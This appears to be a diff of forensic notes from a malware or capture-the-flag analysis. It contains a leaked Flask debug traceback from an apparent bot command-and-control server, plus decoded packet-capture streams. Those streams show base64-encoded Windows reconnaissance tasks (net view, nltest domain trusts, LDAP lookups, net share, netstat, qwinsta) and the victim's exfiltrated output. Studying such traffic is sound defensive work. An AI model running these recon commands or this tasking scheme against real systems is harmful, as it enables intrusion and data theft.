+<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
+<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013021728">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
+      line <em class="line">1509</em>,
+      in <code class="function">dispatch_request</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">            </span>getattr(rule, &quot;provide_automatic_options&quot;, False)</pre>
+<pre class="line before"><span class="ws">            </span>and req.method == &quot;OPTIONS&quot;</pre>
+<pre class="line before"><span class="ws">        </span>):</pre>
+<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
+<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
+<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
+<pre class="line after"><span class="ws">        </span>&quot;&quot;&quot;Dispatches the request and on top of that performs request</pre>
+<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
+<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013020944">
+  <h4>File <cite class="filename">"/app/application/util.py"</cite>,
+      line <em class="line">11</em>,
+      in <code class="function">wrap</code></h4>
+  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws"></span>def is_bot(f):</pre>
+<pre class="line before"><span class="ws">    </span>@functools.wraps(f)</pre>
+<pre class="line before"><span class="ws">    </span>def wrap(*args, **kwargs):</pre>
+<pre class="line before"><span class="ws">        </span>if current_app.config[&#x27;BOT_CONFIG&#x27;][&#x27;user_agent&#x27;] == request.headers.get(&#x27;User-Agent&#x27;):</pre>
+<pre class="line current"><span class="ws">            </span>return f(*args, **kwargs)</pre>
+<pre class="line after"><span class="ws">        </span>else:</pre>
+<pre class="line after"><span class="ws">            </span>return send_from_directory(&#x27;./static/js&#x27;, os.path.basename(current_app.config[&#x27;BOT_CONFIG&#x27;][&#x27;get_uri&#x27;]))</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>return wrap</pre>
+<pre class="line after"><span class="ws"></span> </pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013021616">
+  <h4>File <cite class="filename">"/app/application/blueprints/routes.py"</cite>,
+      line <em class="line">55</em>,
+      in <code class="function">botRecv</code></h4>
+  <div class="source "><pre class="line before"><span class="ws">        </span>return fake_script()</pre>
+<pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws">    </span>bot = Bot(botUUID)</pre>
+<pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws">    </span>if botDATA:</pre>
+<pre class="line current"><span class="ws">        </span>taskDATA = json.loads(rec_b64(unquote_plus(botDATA)))</pre>
+<pre class="line after"><span class="ws">        </span>bot.saveTaskResp(**taskDATA)</pre>
+<pre class="line after"><span class="ws"></span> </pre>
+<pre class="line after"><span class="ws">    </span>return fake_script(f&#x27;task=&quot;&quot;;&#x27;)</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013022064">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/json/__init__.py"</cite>,
+      line <em class="line">357</em>,
+      in <code class="function">loads</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">        </span>del kw[&#x27;encoding&#x27;]</pre>
+<pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws">    </span>if (cls is None and object_hook is None and</pre>
+<pre class="line before"><span class="ws">            </span>parse_int is None and parse_float is None and</pre>
+<pre class="line before"><span class="ws">            </span>parse_constant is None and object_pairs_hook is None and not kw):</pre>
+<pre class="line current"><span class="ws">        </span>return _default_decoder.decode(s)</pre>
+<pre class="line after"><span class="ws">    </span>if cls is None:</pre>
+<pre class="line after"><span class="ws">        </span>cls = JSONDecoder</pre>
+<pre class="line after"><span class="ws">    </span>if object_hook is not None:</pre>
+<pre class="line after"><span class="ws">        </span>kw[&#x27;object_hook&#x27;] = object_hook</pre>
+<pre class="line after"><span class="ws">    </span>if object_pairs_hook is not None:</pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013022176">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/json/decoder.py"</cite>,
+      line <em class="line">337</em>,
+      in <code class="function">decode</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws">    </span>def decode(self, s, _w=WHITESPACE.match):</pre>
+<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;Return the Python representation of ``s`` (a ``str`` instance</pre>
+<pre class="line before"><span class="ws">        </span>containing a JSON document).</pre>
+<pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;</pre>
+<pre class="line current"><span class="ws">        </span>obj, end = self.raw_decode(s, idx=_w(s, 0).end())</pre>
+<pre class="line after"><span class="ws">        </span>end = _w(s, end).end()</pre>
+<pre class="line after"><span class="ws">        </span>if end != len(s):</pre>
+<pre class="line after"><span class="ws">            </span>raise JSONDecodeError(&quot;Extra data&quot;, s, end)</pre>
+<pre class="line after"><span class="ws">        </span>return obj</pre>
+<pre class="line after"><span class="ws"></span> </pre></div>
+</div>
+
+<li><div class="frame" id="frame-139855013022400">
+  <h4>File <cite class="filename">"/usr/local/lib/python3.8/json/decoder.py"</cite>,
+      line <em class="line">355</em>,
+      in <code class="function">raw_decode</code></h4>
+  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
+<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;</pre>
+<pre class="line before"><span class="ws">        </span>try:</pre>
+<pre class="line before"><span class="ws">            </span>obj, end = self.scan_once(s, idx)</pre>
+<pre class="line before"><span class="ws">        </span>except StopIteration as err:</pre>
+<pre class="line current"><span class="ws">            </span>raise JSONDecodeError(&quot;Expecting value&quot;, s, err.value) from None</pre>
+<pre class="line after"><span class="ws">        </span>return obj, end</pre></div>
+</div>
+</ul>
+  <blockquote>json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+</blockquote>
+</div>
+
+<div class="plain">
+    <p>
+      This is the Copy/Paste friendly version of the traceback.
+    </p>
+    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 2095, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 2080, in wsgi_app
+    response = self.handle_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 2077, in wsgi_app
+    response = self.full_dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1525, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1523, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1509, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File &quot;/app/application/util.py&quot;, line 11, in wrap
+    return f(*args, **kwargs)
+  File &quot;/app/application/blueprints/routes.py&quot;, line 55, in botRecv
+    taskDATA = json.loads(rec_b64(unquote_plus(botDATA)))
+  File &quot;/usr/local/lib/python3.8/json/__init__.py&quot;, line 357, in loads
+    return _default_decoder.decode(s)
+  File &quot;/usr/local/lib/python3.8/json/decoder.py&quot;, line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File &quot;/usr/local/lib/python3.8/json/decoder.py&quot;, line 355, in raw_decode
+    raise JSONDecodeError(&quot;Expecting value&quot;, s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+</textarea>
+</div>
+<div class="explanation">
+  The debugger caught an exception in your WSGI application.  You can now
+  look at the traceback which led to the error.  <span class="nojavascript">
+  If you enable JavaScript you can also use additional features such as code
+  execution (if the evalex feature is enabled), automatic pasting of the
+  exceptions and much more.</span>
+</div>
+      <div class="footer">
+        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
+        friendly Werkzeug powered traceback interpreter.
+      </div>
+    </div>
+
+    <div class="pin-prompt">
+      <div class="inner">
+        <h3>Console Locked</h3>
+        <p>
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        <form>
+          <p>PIN:
+            <input type=text name=pin size=14>
+            <input type=submit name=btn value="Confirm Pin">
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
+
+<!--
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2095, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2080, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2077, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1525, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1523, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1509, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/app/application/util.py", line 11, in wrap
+    return f(*args, **kwargs)
+  File "/app/application/blueprints/routes.py", line 55, in botRecv
+    taskDATA = json.loads(rec_b64(unquote_plus(botDATA)))
+  File "/usr/local/lib/python3.8/json/__init__.py", line 357, in loads
+    return _default_decoder.decode(s)
+  File "/usr/local/lib/python3.8/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "/usr/local/lib/python3.8/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+
+
+-->
+
+tcp stream eq 7 (POST):
+{"id": 20, "output": "CldpbmRvd3MgSVAgQ29uZmlndXJhdGlvbgoKICAgSG9zdCBOYW1lIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIDogREVTS1RPUC1RVjNOUUxNCiAgIFByaW1hcnkgRG5zIFN1ZmZpeCAgLiAuIC4gLiAuIC4gLiA6IAogICBOb2RlIFR5cGUgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gOiBIeWJyaWQKICAgSVAgUm91dGluZyBFbmFibGVkLiAuIC4gLiAuIC4gLiAuIDogTm8KICAgV0lOUyBQcm94eSBFbmFibGVkLiAuIC4gLiAuIC4gLiAuIDogTm8KICAgRE5TIFN1ZmZpeCBTZWFyY2ggTGlzdC4gLiAuIC4gLiAuIDogbG9jYWxkb21haW4KCkV0aGVybmV0IGFkYXB0ZXIgRXRoZXJuZXQwOgoKICAgQ29ubmVjdGlvbi1zcGVjaWZpYyBETlMgU3VmZml4ICAuIDogbG9jYWxkb21haW4KICAgRGVzY3JpcHRpb24gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIDogSW50ZWwoUikgODI1NzRMIEdpZ2FiaXQgTmV0d29yayBDb25uZWN0aW9uCiAgIFBoeXNpY2FsIEFkZHJlc3MuIC4gLiAuIC4gLiAuIC4gLiA6IDAwLTBDLTI5LTU0LUQxLTUzCiAgIERIQ1AgRW5hYmxlZC4gLiAuIC4gLiAuIC4gLiAuIC4gLiA6IFllcwogICBBdXRvY29uZmlndXJhdGlvbiBFbmFibGVkIC4gLiAuIC4gOiBZZXMKICAgTGluay1sb2NhbCBJUHY2IEFkZHJlc3MgLiAuIC4gLiAuIDogZmU4MDo6NjA2NzoxMTUyOmJhNmM6MjZjNyU2KFByZWZlcnJlZCkgCiAgIElQdjQgQWRkcmVzcy4gLiAuIC4gLiAuIC4gLiAuIC4gLiA6IDE5Mi4xNjguMTM3LjEzMShQcmVmZXJyZWQpIAogICBTdWJuZXQgTWFzayAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gOiAyNTUuMjU1LjI1NS4wCiAgIExlYXNlIE9idGFpbmVkLiAuIC4gLiAuIC4gLiAuIC4gLiA6IDI0IEp1bmUgMjAyMiAxNzo0ODoxMwogICBMZWFzZSBFeHBpcmVzIC4gLiAuIC4gLiAuIC4gLiAuIC4gOiAyNCBKdW5lIDIwMjIgMjI6MzM6MTQKICAgRGVmYXVsdCBHYXRld2F5IC4gLiAuIC4gLiAuIC4gLiAuIDogCiAgIERIQ1AgU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiA6IDE5Mi4xNjguMTM3LjI1NAogICBESENQdjYgSUFJRCAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gOiAxMDA2NjY0MDkKICAgREhDUHY2IENsaWVudCBEVUlELiAuIC4gLiAuIC4gLiAuIDogMDAtMDEtMDAtMDEtMjktMzgtM0EtNTgtMDAtMEMtMjktNTQtRDEtNTMKICAgRE5TIFNlcnZlcnMgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIDogMTkyLjE2OC4xMzcuMQogICBOZXRCSU9TIG92ZXIgVGNwaXAuIC4gLiAuIC4gLiAuIC4gOiBFbmFibGVk"}
+output:
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DESKTOP-QV3NQLM
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : localdomain
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : localdomain
+   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
+   Physical Address. . . . . . . . . : 00-0C-29-54-D1-53
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::6067:1152:ba6c:26c7%6(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.137.131(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : 24 June 2022 17:48:13
+   Lease Expires . . . . . . . . . . : 24 June 2022 22:33:14
+   Default Gateway . . . . . . . . . : 
+   DHCP Server . . . . . . . . . . . : 192.168.137.254
+   DHCPv6 IAID . . . . . . . . . . . : 100666409
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-38-3A-58-00-0C-29-54-D1-53
+   DNS Servers . . . . . . . . . . . : 192.168.137.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+tcp stream eq 9(GET):
+{"id": 21, "cmd": "bmV0IHZpZXcgL2FsbA=="} // net view /all
+
+tcp stream eq 10
+// a bunch of gibberish:
+0(.&.$not_defined_in_RFC4178@please_ignore
+thunderpalace2
+
+tcp stream eq 11(POST):
+
+{"id": 21, "output": "U3lzdGVtIGVycm9yIDEyMzEgaGFzIG9jY3VycmVkLgoKVGhlIG5ldHdvcmsgbG9jYXRpb24gY2Fubm90IGJlIHJlYWNoZWQuIEZvciBpbmZvcm1hdGlvbiBhYm91dCBuZXR3b3JrIHRyb3VibGVzaG9vdGluZywgc2VlIFdpbmRvd3MgSGVscC4K"}
+System error 1231 has occurred.
+
+The network location cannot be reached. For information about network troubleshooting, see Windows Help.
+
+
+tcp stream eq 12(GET):
+
+{"id": 22, "cmd": "Y21kIC9jIHNldA=="} // cmd /c set
+
+tcp stream eq 13(POST):
+{"id": 22, "output": "J3NldCInIGlzIG5vdCByZWNvZ25pemVkIGFzIGFuIGludGVybmFsIG9yIGV4dGVybmFsIGNvbW1hbmQsCm9wZXJhYmxlIHByb2dyYW0gb3IgYmF0Y2ggZmlsZS4="}
+
+'set"' is not recognized as an internal or external command,
+operable program or batch file.
+
+tcp stream eq 14(GET):
+{"id": 23, "cmd": "bnNsb29rdXAgLXF1ZXJ5dHlwZT1BTEwgLXRpbWVvdXQ9MTAgX2xkYXAuX3RjcC5kYy5fbXNkY3Mue0RPTUFJTn0="}
+// nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.{DOMAIN}
+
+tcp stream eq 15(POST):
+{"id": 23, "output": "KioqIFJlcXVlc3QgdG8gVW5Lbm93biB0aW1lZC1vdXQKCkROUyByZXF1ZXN0IHRpbWVkIG91dC4KICAgIHRpbWVvdXQgd2FzIDEwIHNlY29uZHMuClNlcnZlcjogIFVuS25vd24KQWRkcmVzczogIDE5Mi4xNjguMTM3LjEKCkROUyByZXF1ZXN0IHRpbWVkIG91dC4KICAgIHRpbWVvdXQgd2FzIDEwIHNlY29uZHMuCkROUyByZXF1ZXN0IHRpbWVkIG91dC4KICAgIHRpbWVvdXQgd2FzIDEwIHNlY29uZHMu"}
+*** Request to UnKnown timed-out
+
+DNS request timed out.
+    timeout was 10 seconds.
+Server:  UnKnown
+Address:  192.168.137.1
+
+DNS request timed out.
+    timeout was 10 seconds.
+DNS request timed out.
+    timeout was 10 seconds.
+
+tcp stream eq 16(GET):
+{"id": 24, "cmd": "bmx0ZXN0IC9kb21haW5fdHJ1c3RzIC9hbGxfdHJ1c3Rz"} // nltest /domain_trusts /all_trusts
+
+tcp stream eq 17(POST):
+{"id": 24, "output": "RW51bWVyYXRpbmcgZG9tYWluIHRydXN0cyBmYWlsZWQ6IFN0YXR1cyA9IDE3MjIgMHg2YmEgUlBDX1NfU0VSVkVSX1VOQVZBSUxBQkxF"}
+Enumerating domain trusts failed: Status = 1722 0x6ba RPC_S_SERVER_UNAVAILABLE
+
+tcp stream eq 18(GET):
+{"id": 25, "cmd": "bmV0IHNoYXJl"} // net share
+
+tcp stream eq 19(POST):
+{"id": 25, "output": "ClNoYXJlIG5hbWUgICBSZXNvdXJjZSAgICAgICAgICAgICAgICAgICAgICAgIFJlbWFyawoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpDJCAgICAgICAgICAgQzpcICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWZhdWx0IHNoYXJlICAgICAgICAgICAgICAgICAgICAgCklQQyQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZSBJUEMgICAgICAgICAgICAgICAgICAgICAgICAKQURNSU4kICAgICAgIEM6XFdpbmRvd3MgICAgICAgICAgICAgICAgICAgICAgUmVtb3RlIEFkbWluICAgICAgICAgICAgICAgICAgICAgIApUaGUgY29tbWFuZCBjb21wbGV0ZWQgc3VjY2Vzc2Z1bGx5Lgo="}
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+The command completed successfully.
+
+tcp stream eq 20 (GET):
+id 26: route print
+
+tcp stream eq 21 (POST):
+id 26: 
+===========================================================================
+Interface List
+  6...00 0c 29 54 d1 53 ......Intel(R) 82574L Gigabit Network Connection
+  1...........................Software Loopback Interface 1
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+    192.168.137.0    255.255.255.0         On-link   192.168.137.131    281
+  192.168.137.131  255.255.255.255         On-link   192.168.137.131    281
+  192.168.137.255  255.255.255.255         On-link   192.168.137.131    281
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link   192.168.137.131    281
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link   192.168.137.131    281
+===========================================================================
+Persistent Routes:
+  None
+
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+  1    331 ::1/128                  On-link
+  6    281 fe80::/64                On-link
+  6    281 fe80::6067:1152:ba6c:26c7/128
+                                    On-link
+tcp stream eq 22(GET):
+id 27: netstat -nao
+
+tcp stream eq 23(POST):
+id 27:
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1120
+  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       704
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       540
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       552
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       460
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1772
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       680
+  TCP    192.168.137.131:139    0.0.0.0:0              LISTENING       4
+  TCP    192.168.137.131:57918  192.168.137.1:139      TIME_WAIT       0
+  TCP    [::]:135               [::]:0                 LISTENING       916
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:5357              [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       704
+  TCP    [::]:49665             [::]:0                 LISTENING       540
+  TCP    [::]:49666             [::]:0                 LISTENING       552
+  TCP    [::]:49667             [::]:0                 LISTENING       460
+  TCP    [::]:49668             [::]:0                 LISTENING       1772
+  TCP    [::]:49669             [::]:0                 LISTENING       680
+  UDP    0.0.0.0:3702           *:*                                    1688
+  UDP    0.0.0.0:3702           *:*                                    1688
+  UDP    0.0.0.0:5050           *:*                                    1120
+  UDP    0.0.0.0:5353           *:*                                    3788
+  UDP    0.0.0.0:5353           *:*                                    1244
+  UDP    0.0.0.0:5353           *:*                                    3788
+  UDP    0.0.0.0:5355           *:*                                    1244
+  UDP    0.0.0.0:53269          *:*                                    1688
+  UDP    127.0.0.1:1900         *:*                                    1688
+  UDP    127.0.0.1:50120        *:*                                    1688
+  UDP    127.0.0.1:53271        *:*                                    460
+  UDP    192.168.137.131:137    *:*                                    4
+  UDP    192.168.137.131:138    *:*                                    4
+  UDP    192.168.137.131:1900   *:*                                    1688
+  UDP    192.168.137.131:50119  *:*                                    1688
+  UDP    [::]:3702              *:*                                    1688
+  UDP    [::]:3702              *:*                                    1688
+  UDP    [::]:5353              *:*                                    1244
+  UDP    [::]:5353              *:*                                    3788
+  UDP    [::]:5355              *:*                                    1244
+  UDP    [::]:53270             *:*                                    1688
+  UDP    [::1]:1900             *:*                                    1688
+  UDP    [::1]:50118            *:*                                    1688
+  UDP    [fe80::6067:1152:ba6c:26c7%6]:1900  *:*                                    1688
+  UDP    [fe80::6067:1152:ba6c:26c7%6]:50117  *:*                                    1688
+
+tcp stream eq 24(GET):
+id 28: net localgroup
+
+tcp stream eq 25
+id 28:
+Aliases for \\DESKTOP-QV3NQLM
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+tcp stream eq 26
+id 29: qwinsta
+tcp stream eq 27
+id 29:
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
+ services                                    0  Disc                        
+>console           Larry Stevens             2  Active         
+
+tcp stream eq 28
+id 30:
+WMI Query ROOT\CIMV2:Win32_BIOS
+
+tcp steram eq 29
+id 30:
+'WMI' is not recognized as an internal or external command,
+operable program or batch file.
+
+tcp stream eq 30
+id 31:
+WMI Query ROOT\CIMV2:Win32_DiskDrive
+
+tcp stream eq 31
+id 31:
+'WMI' is not recognized as an internal or external command,
+operable program or batch file.
+
+tcp stream eq 32
+id 32:
+WMI Query ROOT\CIMV2:Win32_PhysicalMemory
+
+tcp stream eq 33
+id 32:
+'WMI' is not recognized as an internal or external command,
+operable program or batch file.
+
+tcp stream eq 34
+id 33:
+WMI Query ROOT\CIMV2:Win32_Product
+
+tcp stream eq 35
+id 33:
+'WMI' is not recognized as an internal or external command,
+operable program or batch file.
+
+tcp stream eq 36
+id 34:
+WMI Query ROOT\CIMV2:Win32_PnPEntity
+
+tcp stream eq 37
+id 34:
+same as above
+
+tcp stream eq 38
+empty
+
+
+
